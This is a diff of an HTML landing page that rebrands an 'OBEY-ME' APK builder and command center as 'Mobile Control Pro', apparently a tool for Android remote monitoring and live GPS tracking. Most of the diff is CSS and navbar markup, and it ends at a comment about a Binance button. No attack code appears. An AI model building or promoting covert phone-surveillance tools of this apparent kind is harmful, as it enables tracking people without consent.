@@ -3,28 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>OBEY-ME — Builder & Command Center</title>
+    <title>Mobile Control Pro — Next-Gen 100% Free Spatial Device Management & Security Platform</title>
     
+    <!-- Meta SEO Tags -->
+    <meta name="description" content="Mobile Control Pro is an open, high-performance, 100% Free 24/7 Android device telemetry and spatial management platform with military-grade End-to-End Encryption. Founded by OHEDUL.">
+    <meta name="keywords" content="Mobile Control Pro, Spatial UI, Device Management, Live GPS Tracker, Android Remote Monitor, 100% Free 24/7, End to End Encryption, OHEDUL, Cloud APK Builder">
+    <meta name="author" content="OHEDUL">
+
+    <!-- Fonts & Icons -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="style.css?v=3.8">
-    
-    <!-- JSZip for extracting APK from GitHub Artifacts -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <link rel="stylesheet" href="style.css?v=5.3">
 
-    <!-- Firebase SDK -->
+    <!-- Cloud Realtime SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        let userId = urlParams.get('uid') || 'master01';
         const FIREBASE_URL = urlParams.get('firebase_url') || "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/";
-        
-        // Extract project ID from database URL for proper initialization
         const projectId = FIREBASE_URL.replace('https://', '').split('.')[0].split('-default-rtdb')[0];
+        
         if (!firebase.apps.length) {
             firebase.initializeApp({
                 apiKey: "AIzaSyBH42JLBcHxguBvzBWjjLIp3PboUJU0LIk",
@@ -34,235 +35,1331 @@
                 appId: "1:103302569626:web:86e5716950842d15650923"
             });
         }
-        const fbDb = firebase.database();
         const fbAuth = firebase.auth();
-        // Set permanent LOCAL auth persistence so users never get logged out
         fbAuth.setPersistence(firebase.auth.Auth.Persistence.LOCAL).catch(err => console.log('Auth persistence err:', err));
 
-        // Register Service Worker for PWA instant load
         if ('serviceWorker' in navigator) {
             window.addEventListener('load', () => {
                 navigator.serviceWorker.register('sw.js').catch(err => console.log('SW reg error:', err));
             });
         }
     </script>
+
+    <style>
+        /* ==========================================================================
+           VISIONOS & APPLE LIQUID GLASS SPATIAL 3D DEPTH ENGINE
+           ========================================================================== */
+        :root {
+            --haze-glow: rgba(255, 59, 48, 0.14);
+            --specular-line: linear-gradient(135deg, rgba(255, 255, 255, 0.35) 0%, rgba(255, 255, 255, 0.05) 50%, rgba(255, 59, 48, 0.25) 100%);
+            --glass-lensing: radial-gradient(circle at 50% 0%, rgba(255, 255, 255, 0.15), rgba(18, 12, 15, 0.5) 75%);
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: #040305;
+            overflow-x: hidden;
+            color: var(--text-primary);
+            position: relative;
+        }
+
+        /* 1. Spatial Background Volumetric Light & Atmospheric Haze */
+        .spatial-scene-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .spatial-light-source-center {
+            position: absolute;
+            top: 15%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 850px;
+            height: 500px;
+            background: radial-gradient(ellipse at center, rgba(255, 59, 48, 0.18) 0%, rgba(225, 29, 72, 0.07) 45%, rgba(4, 3, 5, 0) 75%);
+            filter: blur(80px);
+            opacity: 0.9;
+            will-change: transform;
+            transition: transform 300ms var(--ease-spring);
+        }
+        .spatial-light-source-right {
+            position: absolute;
+            top: 45%;
+            right: -10%;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(185, 28, 28, 0.12) 0%, transparent 65%);
+            filter: blur(90px);
+        }
+        .spatial-light-source-left {
+            position: absolute;
+            bottom: 5%;
+            left: -10%;
+            width: 700px;
+            height: 700px;
+            background: radial-gradient(circle, rgba(255, 42, 95, 0.08) 0%, transparent 65%);
+            filter: blur(100px);
+        }
+        .volumetric-grid-plane {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
+            background-size: 80px 80px;
+            mask-image: radial-gradient(ellipse 60% 50% at 50% 40%, rgba(0,0,0,0.8) 0%, transparent 75%);
+            -webkit-mask-image: radial-gradient(ellipse 60% 50% at 50% 40%, rgba(0,0,0,0.8) 0%, transparent 75%);
+            transform: rotateX(45deg) scale(1.5) translateY(-10%);
+            transform-origin: center top;
+            opacity: 0.5;
+        }
+
+        /* 2. Floating Navbar Layer with High Elevation */
+        .spatial-header-wrap {
+            position: sticky;
+            top: 14px;
+            z-index: 9999;
+            padding: 0 16px;
+            pointer-events: auto;
+        }
+
+        .spatial-navbar {
+            max-width: 1240px;
+            margin: 0 auto;
+            padding: 10px 24px;
+            background: rgba(18, 12, 16, 0.78);
+            border: 1px solid rgba(255, 255, 255, 0.14);
+            border-top: 1px solid rgba(255, 255, 255, 0.32);
+            border-radius: var(--radius-pill);
+            backdrop-filter: blur(32px) saturate(190%);
+            -webkit-backdrop-filter: blur(32px) saturate(190%);
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.65), 0 1px 0 rgba(255, 255, 255, 0.15) inset, 0 0 24px rgba(255, 59, 48, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+            z-index: 10000;
+            pointer-events: auto;
+            transition: all 260ms var(--ease-spring);
+        }
+
+        .spatial-navbar.scrolled {
+            box-shadow: 0 22px 50px rgba(0, 0, 0, 0.85), 0 0 25px rgba(255, 59, 48, 0.15);
+            background: rgba(14, 9, 13, 0.9);
+        }
+
+        /* Premium Brand Spatial Emblem Logo */
+        .spatial-brand-emblem {
+            position: relative;
+            width: 44px;
+            height: 44px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .emblem-glass-cube {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(255, 59, 48, 0.95) 0%, rgba(185, 28, 28, 0.9) 100%);
+            border-radius: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-top: 1.5px solid rgba(255, 255, 255, 0.5);
+            box-shadow: 
+                0 8px 24px var(--primary-glow),
+                0 2px 6px rgba(0, 0, 0, 0.5),
+                inset 0 1px 2px rgba(255, 255, 255, 0.45);
+            transition: transform 220ms var(--ease-spring), box-shadow 220ms var(--ease-spring);
+        }
+
+        .spatial-brand-emblem:hover .emblem-glass-cube {
+            transform: scale(1.08) rotate(-4deg);
+            box-shadow: 0 12px 30px rgba(255, 59, 48, 0.55), inset 0 1px 2px rgba(255, 255, 255, 0.6);
+        }
+
+        .emblem-icon-svg {
+            position: relative;
+            z-index: 2;
+            width: 24px;
+            height: 24px;
+            fill: #ffffff;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
+        }
+
+        .emblem-satellite-pulse {
+            position: absolute;
+            top: -2px;
+            right: -2px;
+            width: 10px;
+            height: 10px;
+            background: #30d158;
+            border: 2px solid #050507;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #30d158;
+            z-index: 3;
+            animation: statusPulseGreen 1.8s infinite;
+        }
+
+        /* Nav Links styling */
+        .spatial-nav-link {
+            color: var(--text-secondary);
+            font-size: 0.92rem;
+            font-weight: 600;
+            padding: 8px 16px;
+            border-radius: var(--radius-sm);
+            text-decoration: none;
+            transition: all 180ms ease-out;
+            cursor: pointer;
+            pointer-events: auto;
+            position: relative;
+            z-index: 10001;
+            user-select: none;
+        }
+
+        .spatial-nav-link:hover {
+            color: #ffffff;
+            background: rgba(255, 255, 255, 0.08);
+            text-shadow: 0 0 12px rgba(255, 255, 255, 0.4);
+        }
+
+        .spatial-nav-link:active {
+            transform: scale(0.97);
+        }
+
+        /* Nav Demo Button */
+        .spatial-nav-demo {
+            background: linear-gradient(135deg, rgba(255, 159, 10, 0.2) 0%, rgba(255, 69, 58, 0.25) 100%);
+            color: #ffd60a !important;
+            border: 1px solid rgba(255, 214, 10, 0.4);
+            border-top: 1.5px solid rgba(255, 255, 255, 0.45);
+            padding: 8px 18px;
+            border-radius: var(--radius-pill);
+            font-size: 0.88rem;
+            font-weight: 700;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            pointer-events: auto;
+            position: relative;
+            z-index: 10001;
+            box-shadow: 0 4px 18px rgba(255, 159, 10, 0.25), inset 0 1px 1px rgba(255, 255, 255, 0.3);
+            transition: all 160ms var(--ease-spring);
+            user-select: none;
+        }
+
+        .spatial-nav-demo:hover {
+            background: linear-gradient(135deg, rgba(255, 159, 10, 0.35) 0%, rgba(255, 69, 58, 0.4) 100%);
+            color: #fff !important;
+            border-color: #ffd60a;
+            box-shadow: 0 6px 25px rgba(255, 214, 10, 0.45), inset 0 1px 1.5px rgba(255, 255, 255, 0.5);
+            transform: scale(1.03);
+        }
+
+        .spatial-nav-demo:active {
+            transform: scale(0.97);
+        }
+
+        /* Nav Launch Button */
+        .spatial-nav-btn {
+            background: linear-gradient(135deg, #ff453a 0%, #c41c24 100%);
+            color: #ffffff !important;
+            border: 1px solid rgba(255, 255, 255, 0.22);
+            border-top: 1.5px solid rgba(255, 255, 255, 0.45);
+            padding: 10px 24px;
+            border-radius: var(--radius-pill);
+            font-size: 0.9rem;
+            font-weight: 700;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            pointer-events: auto;
+            position: relative;
+            z-index: 10001;
+            box-shadow: 0 6px 25px var(--primary-glow), inset 0 1px 1.5px rgba(255, 255, 255, 0.4);
+            transition: transform 140ms ease, box-shadow 180ms ease;
+            user-select: none;
+        }
+
+        .spatial-nav-btn:hover {
+            background: linear-gradient(135deg, #ff574d 0%, #d41821 100%);
+            box-shadow: 0 8px 32px rgba(255, 59, 48, 0.45), inset 0 1px 2px rgba(255, 255, 255, 0.5);
+            color: #ffffff;
+        }
+
+        .spatial-nav-btn:active {
+            transform: scale(0.97);
+        }
+
+        /* 3. Hero Section Spatial Hierarchy */
+        .hero-spatial-container {
+            position: relative;
+            padding: 50px 24px 70px;
+            text-align: center;
+            transform-style: preserve-3d;
+        }
+        
+        .free-24-7-banner {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(48, 209, 88, 0.12);
+            border: 1.5px solid rgba(48, 209, 88, 0.6);
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            padding: 12px 28px;
+            border-radius: var(--radius-pill);
+            color: #30d158;
+            font-family: 'Outfit', -apple-system, sans-serif;
+            font-size: 1.15rem;
+            font-weight: 800;
+            letter-spacing: -0.01em;
+            box-shadow: 0 8px 30px rgba(48, 209, 88, 0.25), inset 0 1px 1.5px rgba(255,255,255,0.4);
+            margin-bottom: 24px;
+            transform: translateZ(40px);
+            transition: transform 180ms ease-out;
+        }
+        .free-24-7-banner:hover {
+            transform: translateZ(50px) scale(1.02);
+            box-shadow: 0 12px 40px rgba(48, 209, 88, 0.35);
+        }
+
+        /* 4. Large 3D Suspended Hero Glass Stage */
+        .hero-3d-stage {
+            position: relative;
+            max-width: 1060px;
+            min-height: 520px;
+            margin: 50px auto 40px;
+            perspective: 1600px;
+            transform-style: preserve-3d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .suspended-glass-device {
+            position: relative;
+            width: 100%;
+            max-width: 820px;
+            min-height: 440px;
+            background: linear-gradient(135deg, rgba(28, 18, 24, 0.76) 0%, rgba(14, 10, 14, 0.88) 100%);
+            border-radius: 32px;
+            border: 1px solid rgba(255, 255, 255, 0.16);
+            border-top: 1.5px solid rgba(255, 255, 255, 0.42);
+            border-left: 1.5px solid rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(40px) saturate(200%);
+            -webkit-backdrop-filter: blur(40px) saturate(200%);
+            box-shadow: 
+                0 40px 100px -20px rgba(0, 0, 0, 0.95),
+                0 0 60px rgba(255, 59, 48, 0.18),
+                inset 0 1px 2px rgba(255, 255, 255, 0.4),
+                inset 0 -1px 2px rgba(0, 0, 0, 0.6);
+            transform-style: preserve-3d;
+            transform: rotateX(8deg) rotateY(-7deg) translateZ(20px);
+            will-change: transform;
+            transition: transform 120ms cubic-bezier(0.16, 1, 0.3, 1);
+            overflow: visible; /* Important: allow 3D floating satellites and chips to float out seamlessly */
+            padding: 26px 32px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .suspended-glass-device::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 45%;
+            background: linear-gradient(180deg, rgba(255, 255, 255, 0.08) 0%, rgba(255, 255, 255, 0) 100%);
+            pointer-events: none;
+            border-radius: 32px 32px 0 0;
+        }
+
+        /* Contact Shadow Underneath 3D Device */
+        .hero-contact-shadow {
+            position: absolute;
+            bottom: -35px;
+            left: 50%;
+            transform: translateX(-50%) rotateX(85deg);
+            width: 85%;
+            height: 100px;
+            background: radial-gradient(ellipse at center, rgba(0, 0, 0, 0.95) 0%, rgba(255, 59, 48, 0.15) 35%, transparent 75%);
+            filter: blur(28px);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        /* Floating Sub-layers inside Hero 3D Object */
+        .glass-sublayer-1 {
+            background: rgba(36, 22, 28, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.14);
+            border-top: 1px solid rgba(255, 255, 255, 0.28);
+            border-radius: 20px;
+            padding: 16px 22px;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4), inset 0 1px 1px rgba(255, 255, 255, 0.2);
+            transform: translateZ(45px);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .glass-sublayer-2 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            transform: translateZ(65px);
+            margin: 18px 0;
+        }
+
+        .glass-telemetry-tile {
+            background: rgba(22, 14, 18, 0.75);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-top: 1px solid rgba(255, 255, 255, 0.28);
+            border-radius: 18px;
+            padding: 16px 18px;
+            box-shadow: 0 10px 28px rgba(0, 0, 0, 0.55), inset 0 1px 1px rgba(255, 255, 255, 0.15);
+            text-align: left;
+            transition: transform 200ms ease, border-color 200ms ease;
+        }
+        .glass-telemetry-tile:hover {
+            transform: translateY(-2px);
+            border-color: rgba(255, 59, 48, 0.4);
+        }
+
+        /* 3D FLOATING SATELLITES & CHIPS (Independently Placed with translateZ) */
+        .floating-accent-chip-left {
+            position: absolute;
+            top: 25px;
+            left: -65px;
+            background: rgba(16, 26, 20, 0.88);
+            border: 1px solid rgba(48, 209, 88, 0.55);
+            border-top: 1.5px solid rgba(48, 209, 88, 0.8);
+            border-radius: 20px;
+            padding: 12px 20px;
+            backdrop-filter: blur(32px) saturate(190%);
+            -webkit-backdrop-filter: blur(32px) saturate(190%);
+            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.8), 0 0 30px rgba(48, 209, 88, 0.3), inset 0 1px 2px rgba(255, 255, 255, 0.4);
+            transform: translateZ(90px) rotateY(12deg);
+            z-index: 20;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            will-change: transform;
+            animation: floatBobbing1 4s ease-in-out infinite;
+        }
+
+        .floating-accent-chip-right {
+            position: absolute;
+            bottom: 25px;
+            right: -65px;
+            background: rgba(30, 16, 20, 0.9);
+            border: 1px solid rgba(255, 59, 48, 0.55);
+            border-top: 1.5px solid rgba(255, 59, 48, 0.8);
+            border-radius: 20px;
+            padding: 12px 20px;
+            backdrop-filter: blur(32px) saturate(190%);
+            -webkit-backdrop-filter: blur(32px) saturate(190%);
+            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 59, 48, 0.3), inset 0 1px 2px rgba(255, 255, 255, 0.4);
+            transform: translateZ(105px) rotateY(-12deg);
+            z-index: 20;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            will-change: transform;
+            animation: floatBobbing2 4.5s ease-in-out infinite;
+        }
+
+        /* NEW 3D SPATIAL SATELLITE ITEMS */
+        .spatial-satellite-top-right {
+            position: absolute;
+            top: -30px;
+            right: -40px;
+            background: rgba(22, 18, 32, 0.9);
+            border: 1px solid rgba(191, 90, 242, 0.55);
+            border-top: 1.5px solid rgba(255, 255, 255, 0.6);
+            border-radius: 18px;
+            padding: 10px 18px;
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            box-shadow: 0 18px 40px rgba(0,0,0,0.75), 0 0 25px rgba(191, 90, 242, 0.35);
+            transform: translateZ(120px) rotateZ(-3deg);
+            z-index: 25;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: floatBobbing3 5s ease-in-out infinite;
+        }
+
+        .spatial-satellite-bottom-left {
+            position: absolute;
+            bottom: -25px;
+            left: -35px;
+            background: rgba(14, 22, 32, 0.9);
+            border: 1px solid rgba(10, 132, 255, 0.55);
+            border-top: 1.5px solid rgba(255, 255, 255, 0.6);
+            border-radius: 18px;
+            padding: 10px 18px;
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            box-shadow: 0 18px 40px rgba(0,0,0,0.75), 0 0 25px rgba(10, 132, 255, 0.35);
+            transform: translateZ(110px) rotateZ(3deg);
+            z-index: 25;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: floatBobbing1 4.2s ease-in-out infinite reverse;
+        }
+
+        /* 3D Floating Geometry Gyro Rings */
+        .spatial-gyro-ring {
+            position: absolute;
+            border-radius: 50%;
+            border: 1.5px dashed rgba(255, 59, 48, 0.25);
+            pointer-events: none;
+            transform-style: preserve-3d;
+        }
+        .spatial-gyro-1 {
+            width: 960px;
+            height: 480px;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%) rotateX(65deg) translateZ(-40px);
+            animation: gyroRotate 25s linear infinite;
+        }
+        .spatial-gyro-2 {
+            width: 820px;
+            height: 420px;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) rotateX(60deg) rotateZ(35deg) translateZ(-60px);
+            border-color: rgba(48, 209, 88, 0.2);
+            animation: gyroRotateReverse 30s linear infinite;
+        }
+
+        @keyframes gyroRotate {
+            0% { transform: translateX(-50%) rotateX(65deg) rotateZ(0deg) translateZ(-40px); }
+            100% { transform: translateX(-50%) rotateX(65deg) rotateZ(360deg) translateZ(-40px); }
+        }
+        @keyframes gyroRotateReverse {
+            0% { transform: translateX(-50%) rotateX(60deg) rotateZ(360deg) translateZ(-60px); }
+            100% { transform: translateX(-50%) rotateX(60deg) rotateZ(0deg) translateZ(-60px); }
+        }
+        @keyframes floatBobbing1 {
+            0%, 100% { transform: translateZ(90px) rotateY(12deg) translateY(0); }
+            50% { transform: translateZ(90px) rotateY(12deg) translateY(-8px); }
+        }
+        @keyframes floatBobbing2 {
+            0%, 100% { transform: translateZ(105px) rotateY(-12deg) translateY(0); }
+            50% { transform: translateZ(105px) rotateY(-12deg) translateY(8px); }
+        }
+        @keyframes floatBobbing3 {
+            0%, 100% { transform: translateZ(120px) rotateZ(-3deg) translateY(0); }
+            50% { transform: translateZ(120px) rotateZ(-3deg) translateY(-6px); }
+        }
+
+        /* Feature Icon Box Definition */
+        .feature-icon-box {
+            width: 52px;
+            height: 52px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.4rem;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.3);
+        }
+
+        /* Stat Badge Definition */
+        .stat-badge {
+            background: rgba(18, 12, 15, 0.65);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 22px 18px;
+            text-align: center;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), inset 0 1px 1px rgba(255, 255, 255, 0.15);
+            transition: transform 180ms ease, border-color 180ms ease;
+        }
+        .stat-badge:hover {
+            transform: translateY(-4px);
+            border-color: rgba(255, 59, 48, 0.35);
+        }
+
+        /* 5. 3D Spatial Feature Architecture */
+        .spatial-feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            gap: 28px;
+            perspective: 1200px;
+        }
+
+        .spatial-card {
+            background: linear-gradient(135deg, rgba(24, 16, 20, 0.65) 0%, rgba(14, 10, 13, 0.8) 100%);
+            border: 1px solid rgba(255, 255, 255, 0.09);
+            border-top: 1px solid rgba(255, 255, 255, 0.25);
+            border-left: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 24px;
+            padding: 34px 30px;
+            backdrop-filter: blur(32px) saturate(180%);
+            -webkit-backdrop-filter: blur(32px) saturate(180%);
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.5), inset 0 1px 1px rgba(255, 255, 255, 0.2);
+            transition: transform 260ms var(--ease-spring), border-color 260ms var(--ease-spring), box-shadow 260ms var(--ease-spring);
+            transform-style: preserve-3d;
+            transform: translateZ(0);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            position: relative;
+        }
+        .spatial-card:hover {
+            transform: translateY(-8px) translateZ(30px) rotateX(2deg) rotateY(-2deg);
+            border-color: rgba(255, 59, 48, 0.45);
+            box-shadow: 
+                0 30px 60px -10px rgba(0, 0, 0, 0.8),
+                0 0 35px rgba(255, 59, 48, 0.18),
+                inset 0 1px 1.5px rgba(255, 255, 255, 0.35);
+        }
+        .spatial-card:active {
+            transform: scale(0.98);
+        }
+
+        /* Elevated Floating Badge on Card */
+        .spatial-card-badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: var(--radius-pill);
+            padding: 4px 12px;
+            font-size: 0.72rem;
+            font-weight: 700;
+            color: var(--text-muted);
+            transform: translateZ(20px);
+        }
+
+        /* 6. Spatial Founder Section */
+        .spatial-founder-shell {
+            background: linear-gradient(135deg, rgba(30, 18, 24, 0.75) 0%, rgba(14, 9, 13, 0.9) 100%);
+            border: 1px solid rgba(255, 59, 48, 0.35);
+            border-top: 1.5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 32px;
+            padding: 48px 42px;
+            display: flex;
+            align-items: center;
+            gap: 40px;
+            backdrop-filter: blur(40px) saturate(190%);
+            -webkit-backdrop-filter: blur(40px) saturate(190%);
+            box-shadow: 0 30px 70px rgba(0, 0, 0, 0.75), 0 0 40px rgba(255, 59, 48, 0.15), inset 0 1px 2px rgba(255, 255, 255, 0.3);
+            transform-style: preserve-3d;
+            transform: translateZ(15px);
+            will-change: transform;
+        }
+
+        .founder-photo-pedestal {
+            position: relative;
+            flex-shrink: 0;
+            transform: translateZ(40px);
+        }
+        .founder-photo-3d {
+            width: 155px;
+            height: 155px;
+            border-radius: 50%;
+            object-fit: cover;
+            object-position: top center;
+            border: 3.5px solid #ff3b30;
+            box-shadow: 
+                0 0 35px rgba(255, 59, 48, 0.45),
+                0 15px 35px rgba(0, 0, 0, 0.8),
+                inset 0 1px 1px rgba(255, 255, 255, 0.4);
+            display: block;
+        }
+        .founder-online-pulse {
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            width: 22px;
+            height: 22px;
+            background: #30d158;
+            border: 3.5px solid #050507;
+            border-radius: 50%;
+            box-shadow: 0 0 16px #30d158;
+        }
+
+        /* 7. Security Spatial Block */
+        .spatial-security-vault {
+            background: linear-gradient(135deg, rgba(20, 14, 18, 0.75) 0%, rgba(10, 8, 11, 0.9) 100%);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-top: 1.5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 32px;
+            padding: 56px 44px;
+            margin: 70px auto;
+            backdrop-filter: blur(40px) saturate(180%);
+            -webkit-backdrop-filter: blur(40px) saturate(180%);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), inset 0 1px 2px rgba(255, 255, 255, 0.25);
+            transform-style: preserve-3d;
+        }
+
+        @media (max-width: 860px) {
+            .spatial-header-wrap {
+                top: 8px;
+                padding: 0 8px;
+            }
+            .spatial-navbar {
+                border-radius: 20px;
+                padding: 10px 14px;
+            }
+            .hero-3d-stage {
+                min-height: auto;
+                margin: 20px auto;
+            }
+            .suspended-glass-device {
+                transform: none !important;
+                min-height: auto;
+                padding: 20px 16px;
+                border-radius: 24px;
+            }
+            .glass-sublayer-2 {
+                grid-template-columns: 1fr;
+            }
+            .floating-accent-chip-left, .floating-accent-chip-right, .spatial-satellite-top-right, .spatial-satellite-bottom-left {
+                position: static;
+                transform: none !important;
+                margin-top: 12px;
+                width: 100%;
+                justify-content: center;
+                animation: none !important;
+            }
+            .spatial-gyro-ring {
+                display: none;
+            }
+            .spatial-founder-shell {
+                flex-direction: column;
+                text-align: center;
+                gap: 24px;
+                padding: 32px 20px;
+                transform: none !important;
+            }
+            .spatial-security-vault {
+                padding: 32px 20px;
+            }
+            .free-24-7-banner {
+                font-size: 0.95rem;
+                padding: 10px 18px;
+            }
+        }
+    </style>
 </head>
 <body>
 
-    <!-- Instant Auth Loading Screen (Apple Liquid Glass) -->
-    <div id="authLoader" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #050507; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px;">
-        <div style="width: 64px; height: 64px; background: linear-gradient(135deg, #ff453a 0%, #b91c1c 100%); border-radius: 18px; display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 30px var(--primary-glow); border: 1px solid rgba(255,255,255,0.2);">
-            <i class="fas fa-satellite-dish" style="font-size: 1.8rem; color: #fff;"></i>
-        </div>
-        <div style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 0.5px;">OBEY-ME</div>
-        <div style="font-size: 0.85rem; color: var(--text-secondary); display: flex; align-items: center; gap: 8px;">
-            <i class="fas fa-circle-notch fa-spin" style="color: var(--primary);"></i> Verifying authentication...
-        </div>
+    <!-- 1. Spatial 3D Volumetric Background Layers -->
+    <div class="spatial-scene-bg" id="spatialBg">
+        <div class="spatial-light-source-center" id="lightCenter"></div>
+        <div class="spatial-light-source-right"></div>
+        <div class="spatial-light-source-left"></div>
+        <div class="volumetric-grid-plane"></div>
     </div>
 
-    <!-- Floating Liquid Glass Navbar -->
-    <nav class="navbar">
-        <div class="navbar-container">
-            <div class="navbar-top-row">
-                <a href="index.html" class="navbar-brand">
-                    <span class="brand-icon"><i class="fas fa-satellite-dish"></i></span>
-                    OBEY-ME
+    <!-- 2. Floating VisionOS Glass Navigation Layer -->
+    <header class="spatial-header-wrap">
+        <nav class="spatial-navbar" id="spatialNav">
+            <!-- New Premium Spatial Brand Emblem Logo -->
+            <a href="home.html" style="display: flex; align-items: center; gap: 14px; text-decoration: none; position: relative; z-index: 10001;">
+                <div class="spatial-brand-emblem">
+                    <div class="emblem-glass-cube"></div>
+                    <!-- Custom SVG Spatial Emblem: Device + Neural Satellite Nodes -->
+                    <svg class="emblem-icon-svg" viewBox="0 0 24 24">
+                        <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14zM12 6c-2.76 0-5 2.24-5 5 0 1.74.89 3.28 2.24 4.19l.76-1.32C9.17 13.36 8.5 12.26 8.5 11c0-1.93 1.57-3.5 3.5-3.5s3.5 1.57 3.5 3.5c0 1.26-.67 2.36-1.5 2.87l.76 1.32C16.11 14.28 17 12.74 17 11c0-2.76-2.24-5-5-5zm0 3c-1.1 0-2 .9-2 2 0 .74.4 1.38 1 1.72V17h2v-4.28c.6-.34 1-.98 1-1.72 0-1.1-.9-2-2-2z"/>
+                    </svg>
+                    <span class="emblem-satellite-pulse"></span>
+                </div>
+                <div>
+                    <span style="font-family: 'Outfit', sans-serif; font-size: 1.32rem; font-weight: 800; color: #fff; letter-spacing: -0.02em; line-height: 1.1; display: block;">Mobile Control <span style="color: var(--primary);">PRO</span></span>
+                    <span style="display: block; font-size: 0.68rem; color: #30d158; font-weight: 700; letter-spacing: 0.5px; margin-top: 1px;">100% FREE • OPEN ACCESS 24/7</span>
+                </div>
+            </a>
+
+            <!-- Functional Smooth-Scroll Navigation Links & Direct Launch Button -->
+            <div style="display: flex; align-items: center; gap: 12px; position: relative; z-index: 10001;">
+                <!-- VIP Binance Button -->
